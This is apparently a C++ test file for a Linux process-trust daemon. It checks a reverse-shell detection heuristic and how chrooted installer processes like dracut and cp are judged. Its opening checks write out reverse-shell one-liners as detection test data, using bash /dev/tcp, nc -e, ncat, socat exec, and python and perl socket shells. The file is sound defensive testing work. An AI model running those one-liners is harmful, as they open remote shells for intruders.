#include "SystemTrust.hpp"
#include "CmdlineHeuristics.hpp"
#include <oreon/Hash.hpp>
#include <atomic>
#include <chrono>
#include <climits>
#include <filesystem>
#include <fstream>
#include <iostream>
#include <thread>
#include <sys/stat.h>
#include <unistd.h>

namespace fs = std::filesystem;
using namespace oreon;
using namespace oreon::trust;

static int failures = 0;
static void check(bool c, const std::string& m) {
  if (!c) { std::cerr << "FAIL: " << m << "\n"; ++failures; }
}

static int rpmMode = 0;
static std::string rpmRootSeen;
static std::string fakeRpm(const std::string& root, const std::string&) {
  if (root != "/") rpmRootSeen = root;
  if (rpmMode == 1) return std::string(64, 'a');
  return {};
}

static std::string proc;
static void fakeProc(int pid, int ppid, int uid, const std::string& comm, const std::string& exe,
                     const std::vector<std::string>& argv, const std::string& root = "",
                     const std::string& cwd = "") {
  const std::string d = proc + "/" + std::to_string(pid);
  fs::remove_all(d);
  fs::create_directories(d);
  std::ofstream(d + "/status") << "Name:\t" << comm << "\nPPid:\t" << ppid << "\nUid:\t" << uid << "\t"
                               << uid << "\t" << uid << "\t" << uid << "\n";
  std::ofstream(d + "/comm") << comm << "\n";
  std::ofstream c(d + "/cmdline");
  for (const auto& a : argv) c << a << '\0';
  fs::create_symlink(exe, d + "/exe");
  if (!root.empty()) fs::create_symlink(root, d + "/root");
  if (!cwd.empty()) fs::create_symlink(cwd, d + "/cwd");
}

static void mode755(const std::string& p) {
  fs::permissions(p, fs::perms::owner_all | fs::perms::group_read | fs::perms::group_exec |
                     fs::perms::others_read | fs::perms::others_exec);
}

static std::string firstReal(std::initializer_list<const char*> l) {
  for (const char* c : l) {
    char r[PATH_MAX];
    if (realpath(c, r) && classifySystemExe(r) != SystemExe::No) return r;
  }
  return {};
}

static std::string setuidExe() {
  for (const char* c : {"/usr/bin/sudo", "/usr/bin/pkexec", "/usr/bin/chfn", "/usr/bin/su", "/usr/bin/passwd",
                        "/usr/bin/gpasswd", "/usr/bin/mount"}) {
    struct stat st{};
    char r[PATH_MAX];
    if (realpath(c, r) && stat(r, &st) == 0 && st.st_uid == 0 && (st.st_mode & S_ISUID) &&
        classifySystemExe(r) != SystemExe::No)
      return r;
  }
  return {};
}

static bool strong(const std::vector<std::string>& argv, const std::string& exe) {
  return heuristics::strongProcessPattern(argv, exe).matched;
}

int main() {
  check(!strong({"cp", "--reflink=auto", "-fL", "/usr/bin/mkfifo", "/var/tmp/dracut.Ab/initramfs/usr/bin/mkfifo"},
                "/usr/bin/cp"), "cp copying mkfifo into an initramfs");
  check(!strong({"/usr/lib/dracut/dracut-install", "-D", "/var/tmp/dracut.Ab/initramfs", "-a", "mkfifo", "socat ",
                 "bash -i"}, "/usr/lib/dracut/dracut-install"), "dracut-install naming mkfifo, socat and bash");
  check(!strong({"rsync", "-a", "-e", "ssh -i /root/.ssh/id", "/a", "/b"}, "/usr/bin/rsync"), "rsync -e is not nc -e");
  check(!strong({"/usr/bin/root-protection", "--check"}, "/usr/bin/root-protection"), "root-protection");
  check(!strong({"python3", "/usr/libexec/x.py", "import socket"}, "/usr/bin/python3"), "script argument, not inline");
  check(!strong({"bash", "-i"}, "/usr/bin/bash"), "plain interactive shell");
  check(strong({"bash", "-c", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"}, "/usr/bin/bash"), "bash /dev/tcp");
  check(strong({"sh", "-c", "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 1.2.3.4 9 >/tmp/f"}, "/bin/sh"), "mkfifo + nc");
  check(strong({"nc", "-e", "/bin/sh", "1.2.3.4", "9"}, "/usr/bin/nc"), "nc -e");
  check(strong({"ncat", "1.2.3.4", "9", "-e", "/bin/bash"}, "/usr/bin/ncat"), "ncat -e");
  check(strong({"socat", "tcp:1.2.3.4:9", "exec:/bin/sh,pty"}, "/usr/bin/socat"), "socat exec");
  check(strong({"python3", "-c", "import socket,subprocess,os;s=socket.socket();os.dup2(s.fileno(),0)"},
               "/usr/bin/python3.12"), "python -c reverse shell");
  check(strong({"python3", "-c", "import pty;pty.spawn('/bin/bash')"}, "/usr/bin/python3"), "pty.spawn");
  check(strong({"perl", "-e", "use Socket;exec(\"/bin/sh -i\");socket(S,PF_INET)"}, "/usr/bin/perl"), "perl -e");

  char tmpl[] = "/tmp/oreon-realworld-XXXXXX";
  const std::string base = mkdtemp(tmpl);
  mode755(base);
  proc = base + "/proc";
  fs::create_directories(proc);
  setProcRoot(proc);
  setRpmDigestFn(&fakeRpm);
  const std::string sys = firstReal({"/usr/bin/true", "/bin/true"});
  const std::string bash = firstReal({"/usr/bin/bash", "/bin/bash"});
  const std::string suid = setuidExe();
  if (sys.empty() || bash.empty() || suid.empty()) {
    std::cerr << "skip: needs root owned true, bash and a set-user-ID root program\n";
    fs::remove_all(base);
    return 77;
  }
  setExtraTrustedOwnerForTests(getuid());

  const std::string mnt = base + "/mnt", T = mnt + "/sysimage";
  for (const auto& d : {"/usr/bin", "/usr/lib/dracut", "/usr/lib64/python3.12/site-packages", "/home/liveuser",
                        "/var/tmp"})
    fs::create_directories(T + d);
  for (const auto& d : {mnt, T, T + "/usr", T + "/usr/bin", T + "/usr/lib", T + "/usr/lib/dracut", T + "/usr/lib64",
                        T + "/usr/lib64/python3.12", T + "/usr/lib64/python3.12/site-packages", T + "/home",
                        T + "/var"})
    mode755(d);
  fs::permissions(T + "/home/liveuser", fs::perms::all);
  fs::permissions(T + "/var/tmp", fs::perms::all);
  fs::create_symlink("usr/bin", T + "/bin");
  auto put = [&](const std::string& src, const std::string& inner) {
    fs::copy_file(src, T + inner, fs::copy_options::overwrite_existing);
    mode755(T + inner);
  };
  put(sys, "/usr/bin/cp");
  put(sys, "/usr/lib/dracut/dracut-install");
  put(sys, "/usr/bin/root-protection");
  put(sys, "/usr/bin/python3");
  put(bash, "/usr/bin/bash");
  std::ofstream(T + "/usr/bin/dracut") << "#!/bin/bash -e\necho\n";
  mode755(T + "/usr/bin/dracut");
  std::ofstream(T + "/usr/lib64/python3.12/site-packages/centrio_helper.py") << "print(1)\n";
  fs::permissions(T + "/usr/lib64/python3.12/site-packages/centrio_helper.py",
                  fs::perms::owner_read | fs::perms::owner_write | fs::perms::group_read | fs::perms::others_read);

  const std::string shown = "/oreon-test-not-mounted/mnt/sysimage";
  setShownPathForTests(T, shown);
  check(!fs::exists(shown), "daemon view path does not exist");

  fakeProc(6999, 1, 1000, "python3", sys, {"python3", "/usr/share/centrio/main.py"});
  fakeProc(7000, 6999, 0, "sudo", suid, {"sudo", "chroot", "/mnt/sysimage", "dracut", "-f"});
  fakeProc(7001, 7000, 0, "sudo", suid, {"sudo", "chroot", "/mnt/sysimage", "dracut", "-f"});
  fakeProc(7002, 7001, 0, "dracut", T + "/usr/bin/bash", {"/bin/bash", "-e", "/usr/bin/dracut", "-f"}, T, T + "/");
  fakeProc(7003, 7002, 0, "cp", T + "/usr/bin/cp",
           {"cp", "--reflink=auto", "-fL", "/usr/bin/mkfifo", "/var/tmp/dracut.Ab/initramfs/usr/bin/mkfifo"}, T,
           T + "/");
  fakeProc(7004, 7002, 0, "dracut-install", T + "/usr/lib/dracut/dracut-install",
           {"/usr/lib/dracut/dracut-install", "-D", "/var/tmp/dracut.Ab/initramfs", "-a", "mkfifo"}, T, T + "/");
  fakeProc(7005, 7001, 0, "root-protection", T + "/usr/bin/root-protection", {"/usr/bin/root-protection"}, T,
           T + "/");

  check(processRoot(7003) == shown, "root named as the daemon sees it");
  {
    ExeView v = exeView(7003);
    check(v.ok && v.inner == "/usr/bin/cp" && v.root == shown, "inner path found through /proc/<pid>/root");
  }
  rpmMode = 0;
  for (int pid : {7003, 7004, 7005}) {
    ActorVerdict a = assessActor(pid);
    check(a.trust == ActorTrust::Trusted, "chrooted pid " + std::to_string(pid) + " trusted: " + a.summary());
    check(a.exe == SystemExe::RootPath, "rpm failure falls back to the path verdict for " + std::to_string(pid));
    check(decideProcess(a, false, true) == ProcessAction::Ignore, "no alert for " + std::to_string(pid));
    check(!mayKill(a), "never killed: " + std::to_string(pid));
  }
  check(rpmRootSeen.rfind(proc + "/", 0) == 0 && rpmRootSeen.size() > 5 &&
            rpmRootSeen.compare(rpmRootSeen.size() - 5, 5, "/root") == 0,
        "rpm --root goes through /proc/<pid>/root");
  rpmMode = 1;
  {
    ActorVerdict a = assessActor(7004);
    check(a.trust == ActorTrust::Trusted && a.exe == SystemExe::RootPath, "rpm mismatch keeps the path verdict");
  }
  rpmMode = 0;

  noteProcess(7003);
  fs::remove_all(proc + "/7003");
  {
    ActorVerdict a = assessActor(7003);
    check(a.found && a.trust == ActorTrust::Trusted, "exited chrooted cp judged from its exec snapshot: " + a.summary());
  }

  fs::permissions(T + "/usr", fs::perms::others_write, fs::perm_options::add);
  check(assessActor(7004).trust == ActorTrust::Untrusted, "writable target usr/ not trusted");
  fs::permissions(T + "/usr", fs::perms::others_write, fs::perm_options::remove);
  fs::permissions(mnt, fs::perms::group_write, fs::perm_options::add);
  check(assessActor(7004).trust == ActorTrust::Trusted, "group writable root owned /mnt still fine");
  fs::permissions(mnt, fs::perms::group_write, fs::perm_options::remove);

  fakeProc(7010, 7001, 0, "python3", T + "/usr/bin/python3", {"python3", "-u", "-m", "centrio_helper"}, T,
           T + "/home/liveuser");
  {
    ActorVerdict a = assessActor(7010);
    check(a.trust == ActorTrust::Trusted, "python -m system module trusted: " + a.summary());
  }
  fakeProc(7011, 7001, 0, "python3", T + "/usr/bin/python3", {"python3", "-m", "dropped"}, T, T + "/home/liveuser");
  std::ofstream(T + "/home/liveuser/dropped.py") << "x\n";
  check(assessActor(7011).trust == ActorTrust::Untrusted, "python -m module from a user folder not trusted");
  fakeProc(7012, 7001, 0, "python3", T + "/usr/bin/python3", {"python3", "-c", "print(1)"}, T, T + "/");
  check(assessActor(7012).trust == ActorTrust::Untrusted, "python -c not trusted");
  fakeProc(7013, 7001, 0, "bash", T + "/usr/bin/bash", {"bash", "-ec", "id"}, T, T + "/");
  check(assessActor(7013).trust == ActorTrust::Untrusted, "bash -ec inline code not trusted");

  fakeProc(7020, 7002, 0, "cp", T + "/usr/bin/bash", {"cp", "-a", "/usr/bin/kmod", "/var/tmp/x"}, T, T + "/");
  std::atomic<bool> done{false};
  std::thread exec([&] {
    std::this_thread::sleep_for(std::chrono::milliseconds(3));
    fs::remove(proc + "/7020/exe");
    fs::create_symlink(T + "/usr/bin/cp", proc + "/7020/exe");
    done = true;
  });
  {
    ExeView v = exeView(7020);
    exec.join();
    check(v.inner == "/usr/bin/cp" && !v.raced, "post-exec exe read again after the race: " + v.inner);
    ActorVerdict a = assessActor(7020);
    check(a.trust == ActorTrust::Trusted && a.exePath.find("/usr/bin/cp") != std::string::npos,
          "judged on the post-exec cp: " + a.summary());
  }

  fakeProc(7030, 6999, 1000, "cp", sys, {"cp", "x", "y"});
  check(assessActor(7030).trust == ActorTrust::Untrusted, "plain user process is not trusted");

  setShownPathForTests("", "");
  setExtraTrustedOwnerForTests(0);
  setProcRoot("");
  setRpmDigestFn(nullptr);
  forgetProcessesForTests();
  fs::remove_all(base);
  if (failures) return 1;
  std::cout << "ok\n";
  return 0;
}
